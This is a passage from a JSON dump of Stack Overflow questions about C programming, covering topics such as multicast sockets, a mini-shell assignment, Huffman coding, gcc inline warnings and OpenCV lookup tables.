(bind(fd, (struct sockaddr *) &amp;addr, sizeof(addr)) &lt; 0) {\n    perror(\"bind\");\n    exit(1);\n}\n\n// use setsockopt() to request that the kernel join a multicast group\nmreq.imr_multiaddr.s_addr = inet_addr(group);\n// [-]    mreq.imr_interface.s_addr = htonl(INADDR_ANY);\nmreq.imr_interface.s_addr = inet_addr(my_ipv4Addr);\nif (setsockopt(fd, IPPROTO_IP, IP_ADD_MEMBERSHIP, &amp;mreq, sizeof(mreq))&lt; 0) {\n    perror(\"setsockopt\");\n    exit(1);\n}\n</code></pre>\n\n<p>Edit:</p>\n\n<p>Let me explain the purpose of my program. <strong>I am writing a little tool, which will check, if a network supports broadcast/multicast.</strong> Therefore I own a system with two interfaces and send via Interface1 a multicast Packet and try to receive it with Interface2. But: The packet shall go through the network, <em>not</em> the loopack device.</p>\n\n<p>The idea is to block multicast-loopback on thread1/interface1 with:</p>\n\n<pre><code>u_char loop = 0;\nsetsockopt(fd, IPPROTO_IP, IP_MULTICAST_LOOP, &amp;loop, sizeof(loop));\n</code></pre>\n\n<p>And to listen on thread2/interface 2 interface-specific. Tcpdump shows, that the packets are arriving, but are dropped with my config above.</p>\n"},{"tags":["c","time","system","open"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13173978,"title":"how to get creation time and last write time of a file , using C?","body":"<p>I'm opening several files , and want to add to my struct the creation time of the file and the  last write time \nIs there a way I can do it ?</p>\n\n<p>thanks !!</p>\n"},{"tags":["c","windows","memcached","mingw","libevent"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":13134616,"title":"How to compile memcached on Windows?","body":"<p>I am trying to get <code>memcached</code> running on Windows. I have downloaded <code>memcached</code> stable latest and compiled it using Mingw under Windows 7. Configure failed with error,</p>\n\n<blockquote>\n  <p>checking for libevent directory... configure: error: libevent is\n  required.  You can get it from <a href=\"http://www.monkey.org/~provos/libevent/\" rel=\"nofollow\">http://www.monkey.org/~provos/libevent/</a></p>\n\n<pre><code>  If it's already installed, specify its path using --with-libevent=/dir/\n</code></pre>\n</blockquote>\n\n<p>Then I downloaded <code>libevent</code> and compiled it. This produced 3 DLLs, libeventcore, libevent-extra and libevent-2.0.5.</p>\n\n<p>I ran configure on <code>memcached</code> again with the option <code>--with-libevent</code>. But for some reason, it fails again with the same error. I have no clue on why it is failing. Can anyone help me to resolve this issue? Or is there a better way to get <code>memcached</code> running on Windows? I have seen lot of pre-built binaries for Windows. But all of them uses old versions of <code>memcached</code>. And AFAIK, Windows is officially supported by <code>memcached</code> in the newer versions. </p>\n\n<p>I am using Windows7 64bit version with MinGW.</p>\n"},{"tags":["java","c","algorithm","data-mining"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":34,"score":-1,"question_id":13173429,"title":"implementation of RElim(recursive elimination) algorithm","body":"<pre><code>function RElim(\n   a   : array of transaction lists, // conditional database to process\n   p   : set of items,               // prefix of the conditional database a\n   smin: int) : int                  // minimum support of an item set\n\nvar i; k: int; ( buffer for the current item )\ns: int; ( support of the current item )\nn: int; ( number of found frequent item sets )\nb: array of transaction lists; ( conditional database for current item )\nt; u: transaction list element; ( to traverse the transaction lists )\n\nbegin (— recursive elimination —)\n   n := 0; ( initialize the number of found item sets )\n   while a is not empty do ( while conditional database is not empty )\n      i := length(a) 􀀀 1; s := a[i].wgt; ( get the next item to process )\n\n      if s  smin then ( if the current item is frequent: )\n         p := p [ fitem(i)g; ( extend the prefix item set and )\n         report p with support s; ( report the found frequent item set )\n         b := array [0::i􀀀1] of transaction lists; ( create an empty list array )\n         t := a[i].head; ( get the list associated with the item )\n         while t 6= nil do ( while not at the end of the list )\n            u := copy of t; t := t.succ; ( copy the transaction list element, )\n            k := u.items[0]; ( go to the next list element, and )\n            remove k from u.items; ( remove the leading item from the copy )\n            if u.items is not empty ( add the copy to the conditional database )\n            then u.succ = b[k].head; b[k].head = u; end;\n            b[k].wgt := b[k].wgt +u.wgt; ( sum the transaction weight )\n         end; ( in the list weight/transaction counter )\n         n := n + 1 + RElim(b; p; smin); ( process the created database recursively )\n         p := p 􀀀 fitem(i)g; ( and sum the found frequent item sets, )\n      end; ( then restore the original item set prefix )\n      t := a[i].head; ( get the list associated with the item )\n      while t 6= nil do ( while not at the end of the list )\n         u := t; t := t.succ; ( note the current list element, )\n         k := u.items[0]; ( go to the next list element, and )\n         remove k from u.items; ( remove the leading item from current )\n         if u.items is not empty ( reassign the noted list element )\n         then u.succ = a[k].head; a[k].head = u; end;\n         a[k].wgt := a[k].wgt +u.wgt; ( sum the transaction weight )\n      end; ( in the list weight/transaction counter )\n      remove a[i] from a; ( remove the processed list )\n   end;\n   return n; ( return the number of frequent item sets )\nend; ( function RElim() )\n</code></pre>\n\n<p><strong>the algorithm is recursive elimination for finding frequent data set element.\ni have to write the source code for it.. which language would be easier to code this.what logic should i use.</strong> </p>\n\n<p>There is a pdf that explains about relim algorithm please help me with the code</p>\n\n<p>Recursive elimination is an algorithm for finding frequent item sets, which is strongly inspired by the FP-growth algorithm and very similar to the H-mine algorithm.</p>\n\n<p>It does its work without prefix trees or any other complicated data structures, processing the transactions directly.</p>\n\n<p>Its main strength is not its speed (although it is not slow, even outperforms Apriori and Eclat on some data sets), but the simplicity of its structure.</p>\n\n<p>Basically all the work is done in one simple recursive function,</p>\n"},{"tags":["c","pointers","null","malloc","empty-string"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":86,"score":0,"question_id":13165647,"title":"Can I check if a pointer has been assigned to something other than malloc?","body":"<p>After setting a <code>char *</code> pointer to <code>malloc(size)</code>, is there a way to check if it's still not been changed? I thought that a pointer to unassigned space would evaluate to <code>NULL</code> but apparently not:</p>\n\n<pre><code>char *string = malloc(500);\nif(string==NULL) puts(\"Hello World\");\nelse puts(\"It's not null\");\n</code></pre>\n\n<p>I think this should output <code>\"Hello World\"</code> but it doesn't. How can I check if string has been changed by something like <code>strcpy()</code> or <code>strcat()</code> or, even more relevantly to my own project, by:</p>\n\n<pre><code>fgets(string, 499, fr)\n</code></pre>\n"},{"tags":["c"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":54,"score":3,"question_id":13172611,"title":"convert digital to string in macro","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/240353/convert-a-preprocessor-token-to-a-string\">Convert a preprocessor token to a string</a>  </p>\n</blockquote>\n\n\n\n<pre><code>#define num 1234\n</code></pre>\n\n<p>I want to define a \"const char*\" based on num, in the sample it would be:</p>\n\n<pre><code>#define num_str \"1234\"\n</code></pre>\n\n<p>Can I write a macro statement to achieve this? \nNB: 1234 would be changed.</p>\n\n<p>Thanks.</p>\n"},{"tags":["java","c++","python","c","cohesion"],"answer_count":9,"favorite_count":4,"up_vote_count":9,"down_vote_count":0,"view_count":884,"score":9,"question_id":10830135,"title":"What is high cohesion and how to use it / make it?","body":"<p>I'm learning computer programming and at several places I've stumbled upon the concept of cohesion and I understand that it is desirable for a software to have \"high cohesion\" but what does it mean? I'm a Java, C and Python programmer learning C++ from the book C++ Primer which mentions cohesion without having it in the index, could you point me to some links about this topic? I did not find the wikipedia page about computer science cohesion informative since it just says it's a qualitative measure and doesn't give real code examples. could you give code examples, in Java, Python, javascript, C(++) or pseudocode to illustrate the difference between high and low cohesion in actual code?</p>\n\n<p>Thanks for any answer</p>\n"},{"tags":["c"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":13172688,"title":"how to parse an iinput command line in writting a mini-shell in c","body":"<ul>\n<li><p>I wrote the following code for my linux mini-shell assignment and i\nkeep getting the following error message.\n     - warning: passing argument 2 of ‘strcat’ from incompatible pointer type\n     - /usr/include/string.h:136:14: note: expected ‘const char * <strong>restrict</strong>’ but \n           argument is of type ‘char **’</p></li>\n<li><p>cld any one go through it and tell me what is wrong?</p></li>\n</ul>\n\n<p>The code:</p>\n\n<pre><code>int countArgs(char n_args[], ...){\n    va_list ap;\n    int i, t;\n    va_start(ap, n_args);\n    for(i=0;t = va_arg(ap, int);i++){ return  t; }\n    va_end(ap);\n}\n\nchar *parse(char buffer[],int num_of_args, char *arguments[])\n{ \n    arguments[num_of_args+1]=NULL;\n    int i;\n\n    for(i=0;i&lt;num_of_args+1;i++){\n        do \n        {\n            arguments[i]= strtok(buffer, \" \");\n        }\n        while(arguments!=NULL);\n    }\n\n    return arguments;\n}\n\nint main(int argc, char **argv)\n    char buffer[512];\n    char *path = \"/bin/\";\n    while(1)\n    {\n        //print the prompt\n        printf(\"myShell&amp;gt;\");\n\n        //get input\n        fgets(buffer, 512, stdin);\n\n        //fork!\n        int pid = fork(); //Error checking to see if fork works\n\n        //If pid !=0 then it's the parent\n        if(pid!=0)\n        {\n            wait(NULL);\n        }\n        else\n        {\n            //if pid = 0 then we're at teh child\n            //Count the number of arguments\n            int num_of_args = countArgs(buffer);\n\n            //create an array of pointers for the arguments to be \n            //passed to execcv.\n            char *arguments[num_of_args+1];\n\n            //parse the input and arguments will have all the arguments\n            // to be passed to the program\n            parse(buffer, num_of_args, arguments);                        \n            arguments[num_of_args+1] = NULL;\n\n            //This will be the final path to the program that we will pass to execv\n            char prog[512];\n\n            //First we copy a /bin/ to prog\n            strcpy(prog, path);\n\n            //Then we concancate the program name to /bin/\n            //If the program name is ls, then it'll be /bin/ls\n            strcat(prog, arguments);\n\n            //pass the prepared arguments to execv and we're done!\n            int rv = execv(prog, arguments);\n        }\n    }\n    return 0;\n}\n</code></pre>\n"},{"tags":["c","linux","math","glibc","libc"],"answer_count":2,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":130,"score":3,"question_id":13149697,"title":"How is sin() implemented in eglibc-2.13?","body":"<p>I need to track down how exactly is <code>double sin(double x)</code> implemented in eglibc-2.13. I downloaded the source code and the only part that made sense was __sin function, that was platform-specific. Is it the heart of what I have in /usr/lib/i386-linux-gnu/libm.a?</p>\n\n<p>How to track down the macrodefinitions that lead from sin() to __sin()? What I <strong>really</strong> need is the exact code (filename and the line is enough) and a way in which the build process deduces which implementation to use. The architecture's i386.</p>\n"},{"tags":["c"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":48,"score":-4,"question_id":13140056,"title":"Parsing a variable number of arguments in my mini-c shell","body":"<p>I was trying to write my own c-shell for a project.But i am having a very hard time in parsing the arguments that are inputted by the user cld anyon help at least tell me where to look for.</p>\n"},{"tags":["c","3d"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":59,"score":-3,"question_id":13041794,"title":"3d trajectory path calculation","body":"<p>I am developing a soccer game where user has to select velocity, angle,azimuth so that user can post a goal using the desired selection.Can anybody formulate me as how to create a trajectory path for the game.Please help me as I am unable to find the solution.</p>\n"},{"tags":["c","image","visual-studio-2008","visual-c++","opencv"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":56,"score":2,"question_id":13147873,"title":"Loading Images from a folder (Using C, OpenCV, VisualStudio 2008)","body":"<p>I am trying to load images from a folder and I am using C, OpenCV, VC++ 2008 Express Edition. My images are located on the desktop and have different names such as Tom.jpg, Flash.jpeg etc.\nI want to load images from this folder in my program and do some experiments on images one at a time at a time and save the results of this experiment in .txt file and the name of the .txt file should be same as that of the .jpeg file. as in the experimental data performed on Tom.jpg should be stored in Tom.txt and Flash.jpg should be stored in Flash.txt etc.</p>\n\n<p>I can do the above procedure(Loading image and storing its data in text file) for one image. i can display 10 images one after one after reading the filenames from a text file which I created manually. But in this case, all the data of different pics gets stored in the same text file and I am unable to distinguish between different sets of data. </p>\n\n<p>can anyone suggest a way to load one image at time from a folder and do the necessary experiments and store the data in a different .txt file and doing the same thing for maybe 1000's of images ?</p>\n"},{"tags":["c","linux","pthreads","posix","context-switch"],"answer_count":1,"favorite_count":3,"up_vote_count":13,"down_vote_count":0,"view_count":1888,"score":13,"question_id":5958941,"title":"Cost of context switch between threads of same process, on Linux","body":"<p>Is there any good empirical data on the cost of context switching between threads of the same process on Linux (x86 and x86_64, mainly, are of interest)? I'm talking about the number of cycles or nanoseconds between the last instruction one thread executes in userspace before getting put to sleep voluntarily or involuntarily, and the first instruction a different thread of the same process executes after waking up on the same cpu/core.</p>\n\n<p>I wrote a quick test program that constantly performs <code>rdtsc</code> in 2 threads assigned to the same cpu/core, stores the result in a volatile variable, and compares to its sister thread's corresponding volatile variable. The first time it detects a change in the sister thread's value, it prints the difference, then goes back to looping. I'm getting minimum/median counts of about 8900/9600 cycles this way on an Atom D510 cpu. Does this procedure seem reasonable, and do the numbers seem believable?</p>\n\n<p>My goal is to estimate whether, on modern systems, thread-per-connection server model could be competitive with or even outperform select-type multiplexing. This seems plausible in theory, as the transition from performing IO on fd <code>X</code> to fd <code>Y</code> involves merely going to sleep in one thread and waking up in another, rather than multiple syscalls, but it's dependent on the overhead of context switching.</p>\n"},{"tags":["c++","c","makefile"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13172363,"title":"Compilation issue in calling function of .o file in .cpp","body":"<p>I have a temp1.c file having a function </p>\n\n<pre><code>int add(int a, int b){ return (a+b); }\n</code></pre>\n\n<p>and temp1.h file</p>\n\n<pre><code>int add(int,int)\n</code></pre>\n\n<p>I have created .o file from it by compiling</p>\n\n<p>g++ -o temp1.o -c temp1.cpp</p>\n\n<p>Now I have to use add function in temp2.cpp placed in a different directory. I have done</p>\n\n<pre><code>#include \"temp1.h\"\nint main(){\nint x = add(5,2);\n}\n</code></pre>\n\n<p>I have to compile temp2.cpp with temp1.o so that I can create a temp2.exe which can call function add. How to compile it?</p>\n"},{"tags":["c","algorithm","huffman"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":142,"score":0,"question_id":13103588,"title":"Huffman Coding in C with order preserving","body":"<p>C to implement algorithms for (a) approximate order-preserving Huffman coding - each phase\nmerging two adjacent subtrees whose weights give the smallest sum.\nThe input is 1) a positive integer n and 2) a sequence of n positive integers giving the frequency\ncounts (weights) for symbols in an ordered character set.</p>\n\n<p>Order preservation is guaranteed only when the leaf order is\nconsistent with the order of the character set.</p>\n\n<p>I have to modify the below code to make the above possible:</p>\n\n<pre><code>    // Huffman code using a minHeap with handles (index-heap-based priority queue).\n// Heap routines are adapted from \"Algorithms in C, Third Edition\", and\n// \"Algorithms in Java, Third Edition\", Robert Sedgewick\n\n// This is a prototype for demonstration purposes only.\n// Minimally, the heap/priority queue implementation should\n// be in a different source file.\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint N,          // Number of items in queue\n        *pq,        // Priority queue\n        *qp,        // Table of handles (for tracking)\n        maxQueued;  // Capacity of priority queue\ndouble *a;      // Pointer to user's table\n\nvoid exch(int i, int j) {\n// Swaps parent with child\n    int t;\n\n    t = pq[i];\n    pq[i] = pq[j];\n    pq[j] = t;\n    qp[pq[i]] = i;\n    qp[pq[j]] = j;\n}\n\nvoid PQinit(double *items, int n, int m) {\n    int i;\n\n    a = items;    // Save reference to index table\n    maxQueued = m;\n    N = 0;\n    pq = (int*) malloc((maxQueued + 1) * sizeof(int)); // Contains subscripts to a[]\n    qp = (int*) malloc(n * sizeof(int)); // Inverse of pq, allows changing priorities\n    if (!pq || !qp) {\n        printf(\"malloc failed %d\\n\", __LINE__);\n        exit(0);\n    }\n// Set all handles to unused\n    for (i = 0; i &lt; n; i++)\n        qp[i] = (-1);\n}\n\nint PQempty() {\n    return !N;\n}\n\nint PQfull() {\n    return N == maxQueued;\n}\n\nint less(int i, int j) {\n// Notice how heap entries reference a[]\n    return a[pq[i]] &lt; a[pq[j]];\n}\n\nvoid fixUp(int *pq, int k) // AKA swim\n{\n    while (k &gt; 1 &amp;&amp; less(k, k / 2)) {\n        exch(k, k / 2);\n        k = k / 2;\n    }\n}\n\nvoid fixDown(int *pq, int k, int N) // AKA sink\n{\n    int j;\n\n    while (2 * k &lt;= N) {\n        j = 2 * k;\n        if (j &lt; N &amp;&amp; less(j + 1, j))\n            j++;\n        if (!less(j, k))\n            break;\n        exch(k, j);\n        k = j;\n    }\n}\n\nvoid PQinsert(int k) {\n    qp[k] = ++N;\n    pq[N] = k;\n    fixUp(pq, N);\n}\n\nint PQdelmin() {\n    exch(1, N);\n    fixDown(pq, 1, --N);\n    qp[pq[N + 1]] = (-1);  // Set to unused\n    return pq[N + 1];\n}\n\nvoid PQchange(int k) {\n    fixUp(pq, qp[k]);\n    fixDown(pq, qp[k], N);\n}\n\n// main implements Huffman code.\n// Index is just a table of priorities whose\n// subscripts are used in the PQ.\n\nmain() {\n    int n, m, op, i, j, val;\n    double *priority, probSum, expected = 0.0;\n    int *left, *right;  // Links for Huffman code tree, root is subscript m-1\n    int *parent;  // For printing the codes\n    int *length;\n    char *outString;\n\n    printf(\"Enter alphabet size\\n\");\n    scanf(\"%d\", &amp;n);\n    m = 2 * n - 1;  // Number of nodes in tree\n    priority = (double*) malloc(m * sizeof(double));\n    left = (int*) malloc(m * sizeof(int));\n    right = (int*) malloc(m * sizeof(int));\n    parent = (int*) malloc(m * sizeof(int));\n    outString = (char*) malloc((n + 1) * sizeof(char));\n    length = (int*) malloc(m * sizeof(int));\n    if (!priority || !left || !right || !parent || !outString || !length) {\n        printf(\"malloc problem %d\\n\", __LINE__);\n        exit(0);\n    }\n\n    PQinit(priority, m, n);\n\n    for (i = 0; i &lt; n; i++)\n        priority[i] = (-1);\n\n// Read and load alphabet symbols' probabilities into priority queue.\n    probSum = 0.0;\n    for (i = 0; i &lt; n; i++) {\n        scanf(\"%lf\", priority + i);\n        probSum += priority[i];\n        PQinsert(i);\n        left[i] = right[i] = (-1);\n    }\n    printf(\"Probabilities sum to %f\\n\", probSum);\n\n// Huffman code tree construction\n    for (i = n; i &lt; m; i++) {\n        left[i] = PQdelmin();\n        right[i] = PQdelmin();\n        parent[left[i]] = parent[right[i]] = i;\n        priority[i] = priority[left[i]] + priority[right[i]];\n        PQinsert(i);\n    }\n    i = PQdelmin();\n    if (i != m - 1) {\n        printf(\"The root isn't the root\\n\");\n        exit(0);\n    }\n    parent[m - 1] = (-1);\n\n// Goes breadth-first from root to compute length of prefix bit codes.\n    length[m - 1] = 0;\n    for (i = m - 1; i &gt;= n; i--)\n        length[left[i]] = length[right[i]] = length[i] + 1;\n\n// Print the leaves, i.e. for the alphabet symbols\n    printf(\"   i  prob  parent  bits product  code\\n\");\n    for (i = 0; i &lt; n; i++) {\n        // Crawl up the tree to get prefix code\n        outString[length[i]] = '\\0';\n        for (j = i; j != m - 1; j = parent[j])\n            outString[length[j] - 1] = (left[parent[j]] == j) ? '0' : '1';\n        printf(\"%5d %5.3f %5d %5d   %5.3f  %s\\n\", i, priority[i], parent[i],\n                length[i], priority[i] * length[i], outString);\n        expected += priority[i] * length[i];\n    }\n    printf(\"Expected bits per symbol: %f\\n\", expected);\n\n// Print the internal nodes\n    printf(\"   i  prob    left right parent\\n\");\n    for (i = n; i &lt; m; i++)\n        printf(\"%5d %5.3f %5d %5d  %5d\\n\", i, priority[i], left[i], right[i],\n                parent[i]);\n\n    free(priority);\n    free(left);\n    free(right);\n    free(parent);\n    free(outString);\n    free(length);\n    free(pq);\n    free(qp);\n}\n</code></pre>\n\n<p>Following was suggested as an approach:</p>\n\n<blockquote>\n  <p>(a). You will want each heap entry to correspond to two adjacent\n  subtrees that could be merged. After a PQdelmin() determines the merge\n  to apply, you will need PQdelete() to discard unneeded candidate(s)\n  (due to the merge) and a PQinsert() to include new candidate(s) (also\n  resulting from the merge). Handles facilitate this.</p>\n</blockquote>\n\n<p>But i am stuck for sequencing and managing the arrays.\nKindly help!</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":68,"score":2,"question_id":13171846,"title":"C Program measure execution time for an instruction","body":"<p>I need to find the time taken to execute a single instruction or a few couple of instructions and print it out in terms of milli seconds. Can some one please share the small code snippet for this.</p>\n\n<p>Thanks.. I need to use this measure the time taken to execute some instructions in my project.</p>\n"},{"tags":["java","c","swing","jni","native"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13171908,"title":"What is meant by \"AWT widgets written in Java which delegated to peer classes that were written in C\"?","body":"<p>I don't understand the meaning of </p>\n\n<blockquote>\n  <p>The original Java AWT was implemented by having widgets written in Java which delegated to peer classes that were written in C</p>\n</blockquote>\n\n<p>The <em>\"peer classes that were written in C\"</em> part:</p>\n\n<p>It means Java classes included native code?</p>\n"},{"tags":["c","linux","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":13171729,"title":"Pragmas behaviour while porting c application from Unix to Linux","body":"<p>Can any body help me to explain the impacts of PRAGMAS while i am moving 'C' files from unix (AIX/HPUX/Solaris) to Linux environment. DO we need to make any changes in order to work them fine or they will be working fine without any changes.?</p>\n\n<p>Please if possible tell me the impacts which we may have to consider while porting from one environment (unix) to other (linux).</p>\n\n<p>Lots of thanks in advance..</p>\n"},{"tags":["c","operating-system","system-calls"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13128130,"title":"Creating a file and write to it random chars using System Calls operations","body":"<p>I'm trying to create a file and copy to it a random chars of 256 MB sizes all by System Calls operations and I just can't understand how should I do that.</p>\n\n<p>Obviously I need the file to be txt file so when I tried to use the <strong>creat</strong> function with O_RDWR flag but it didn't creat a txt file, it was something unknown which I couldn't open. I saw a PERMS thing on web, which I didn't understand. This is what I wrote so far:</p>\n\n<pre><code>char buff[1024*1024]; \nj=0;\nfor (i=0;i&lt;(1024*1024);i++){\n    if (j==256) j=0;\n\n    buff[i]='a'+j;\n\n    j++;\n}\n\nfd= open(argv[1], O_RDWR);\nif (fd &lt; 0) { \n    fd= creat(argv[1],O_RDWR);\n    for (i=0; i&lt;256; i++) {\n        write(fd, buff, 1024*1024);\n    }\n</code></pre>\n\n<p>It does create the file, but it is inaccessible and it is of size 0.</p>\n"},{"tags":["c++","c","windows","unicode","wchar-t"],"answer_count":10,"favorite_count":10,"up_vote_count":43,"down_vote_count":0,"view_count":11962,"score":43,"question_id":234365,"title":"Is TCHAR still relevant?","body":"<p>I'm new to Windows programming and after reading the Petzold book I wonder: </p>\n\n<p>is it still good practice to use the <code>TCHAR</code> type and the <code>_T()</code> function to declare strings or if I should just use the <code>wchar_t</code> and <code>L\"\"</code> strings in new code?</p>\n\n<p>I will target only Windows 2000 and up and my code will be <a href=\"http://en.wikipedia.org/wiki/Internationalization_and_localization\" rel=\"nofollow\">i18n</a> from the start up.</p>\n"},{"tags":["c","struct","typedef"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13171544,"title":"Error on typedef struct. before '*' token","body":"<p>The compiler is gcc and I'm using an old version of linux.</p>\n\n<pre><code>typedef struct strlist strlist;\n\nstruct strlist\n{\n    char *data;\n    time_t *timestamp;\n    struct strlist *next;\n}\n\nstrlist * list_directory(char *dirname)\n{\n//do something\n}\n</code></pre>\n\n<p>The error message is:</p>\n\n<pre><code>error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘*’ token\n</code></pre>\n\n<p>it's on the line:</p>\n\n<pre><code>strlist * list_directory(char *dirname)\n</code></pre>\n"},{"tags":["c","unix","system","man"],"answer_count":5,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":6860,"score":7,"question_id":572942,"title":"What's the difference between \"C system calls\" and \"C library routines\"?","body":"<p>There are multiple sections in the manpages. Two of them are:</p>\n\n<pre>\n2     Unix and C system calls\n3     C Library routines for C programs\n</pre>\n\n<p>For example there is <a href=\"http://developer.apple.com/documentation/Darwin/Reference/ManPages/man3/getmntinfo.3.html\"><code>getmntinfo(3)</code></a> and <a href=\"http://developer.apple.com/documentation/Darwin/Reference/ManPages/man2/getfsstat.2.html\"><code>getfsstat(2)</code></a>, both look like they do the same thing. When should one use which and what is the difference?</p>\n"},{"tags":["c++","c"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":55,"score":-1,"question_id":13171183,"title":"Declare And Define","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1410563/what-is-the-difference-between-a-definition-and-a-declaration\">What is the difference between a definition and a declaration?</a>  </p>\n</blockquote>\n\n\n\n<p>I am very confused in these two terms for variables. In some books it seems to be same, but in some books its quite different.\nCan anyone tell me, what is the meaning of declaration of variables or functions and what is the meaning of definition of variables or functions? </p>\n"},{"tags":["c","gcc"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":13147170,"title":"__attribute__((always_inline)) failing","body":"<p>I wonder if some one can shed some light on this. I got a header file with a few <code>always_inline</code> methods, which gets included several places. Since I upgraded the OS (Debian Wheezy) with a newer version of gcc 4.7.1 I am getting a load of warnings on failing inlines. I am able to compile this successfully on gcc 4.4.5 (Debian Squeezy). Compile command I am using is</p>\n\n<pre><code>gcc -g -Wall -O0 -o [prog_name] [sources].c -l[link libraries]\n</code></pre>\n\n<p>Code:</p>\n\n<pre><code>#ifndef __MCIDSHEADER_H__\n#define __MCIDSHEADER_H__\n\n#include &lt;stdlib.h&gt;\n\n/* C functions */\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n    /* Constructor and destructor */\n    mcidsheader* mcidsheader_new(mcidsheader* obj, sqlite3* ids, crSettings* settings);\n    void mcidsheader_delete(mcidsheader* obj);\n\n/* set schedule number */\n__attribute__ ((always_inline)) static int mcidsheader_set_schedno(mcidsheader* obj, unsigned int var)\n{\n    MC_CHK_OBJ(obj);\n    obj-&gt;var_sched_no = var;\n    /* memset schedule number */\n    memset(obj-&gt;var_sched, 0, MCIDSHEADER_SCHEDNUM_SZ);\n    /* copy to local */\n    sprintf(obj-&gt;var_sched, \"%i\", var);\n    obj-&gt;var_flg = 0;\n    return 0;\n}\n\n/* Get schedule number */\n__attribute__ ((always_inline)) static const char* mcidsheader_get_schedno(const mcidsheader* obj)\n{\n    MC_CHK_OBJ_PTR(obj);\n    return obj-&gt;var_sched;\n}\n\n/* set job number */\n__attribute__ ((always_inline)) static int mcidsheader_set_jobnumber(mcidsheader* obj, const char* var)\n{\n    MC_CHK_OBJ(obj);\n\n    /* memset buff */\n    memset(obj-&gt;var_jobnumber, 0, MCIDSHEADER_JOBNUMBER_SZ);\n    MC_CHK_OBJ(var);\n    /* copy to local */\n    strcpy(obj-&gt;var_jobnumber, var);\n    obj-&gt;var_flg = 0;\n    return 0;\n}\n\n/* get job number */\n__attribute__ ((always_inline)) static const char* mcidsheader_get_jobnumber(const mcidsheader* obj)\n{\n    MC_CHK_OBJ_PTR(obj);\n    return obj-&gt;var_jobnumber;\n}\n\n/* set project */\n__attribute__ ((always_inline)) static int mcidsheader_set_project(mcidsheader* obj, const char* var)\n{\n    MC_CHK_OBJ(obj);\n\n    /* memset buff */\n    memset(obj-&gt;var_project, 0, MCIDSHEADER_PROJECT_SZ);\n    MC_CHK_OBJ(var);\n\n    /* copy to local */\n    strcpy(obj-&gt;var_project, var);\n    obj-&gt;var_flg = 0;\n    return 0;\n}\n\n/* Get project name */\n__attribute__ ((always_inline)) static const char* mcidsheader_get_project(const mcidsheader* obj)\n{\n    MC_CHK_OBJ_PTR(obj);\n    return obj-&gt;var_project;\n}\n\n/* Set client */\n__attribute__ ((always_inline)) static int  mcidsheader_set_client(mcidsheader* obj, const char* var)\n{\n    MC_CHK_OBJ(obj);\n\n    /* memset buff */\n    memset(obj-&gt;var_client, 0, MCIDSHEADER_CLIENT_SZ);\n    MC_CHK_OBJ(var);\n\n    /* copy to local */\n    strcpy(obj-&gt;var_client, var);\n    obj-&gt;var_flg = 0;\n    return 0;\n}\n\n/* get client */\n__attribute__ ((always_inline)) static const char* mcidsheader_get_client(const mcidsheader* obj)\n{\n    MC_CHK_OBJ(obj);\n    return obj-&gt;var_client;\n}\n\n/* set date */\n__attribute__ ((always_inline)) static int mcidsheader_set_date(mcidsheader* obj, const char* var)\n{\n    MC_CHK_OBJ(obj);\n    /* memset buff */\n    memset(obj-&gt;var_date, 0, MCIDSHEADER_DATE_SZ);\n    MC_CHK_OBJ(var);\n    /* copy to local */\n    strcpy(obj-&gt;var_date, var);\n    obj-&gt;var_flg = 0;\n    return 0;\n}\n\n/* get date */\n__attribute__ ((always_inline)) static const char* mcidsheader_get_date(const mcidsheader* obj)\n{\n    MC_CHK_OBJ_PTR(obj);\n    return obj-&gt;var_date;\n}\n\n/* Get struct size */\n__attribute__ ((always_inline)) static unsigned int mcidsheader_get_size(const mcidsheader* obj)\n{\n    if(!obj) return 0;\n    return obj-&gt;var_size;\n}\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif /* __MCIDSHEADER_H__ */\n</code></pre>\n"},{"tags":["c","opencv"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13170593,"title":"How to create a look up table for different range of values","body":"<p>I'm want to try using look up table (cvLUT) to check whether it is fast than the current way that I'm doing right now. The question is I don't really understand how look up table works if I have different set of values Eg.</p>\n\n<pre><code>if(mean &lt; 50)\n //do gamma correction\nelse if(mean &gt; 50 &amp;&amp; mean &lt; 100)\n // do gamma correction\nelse \n //do do gamma correction\n</code></pre>\n\n<p>I saw that we need to calculate the look up table first but the mean is calculated locally using local window. How can I do that? I tried stored the mean values 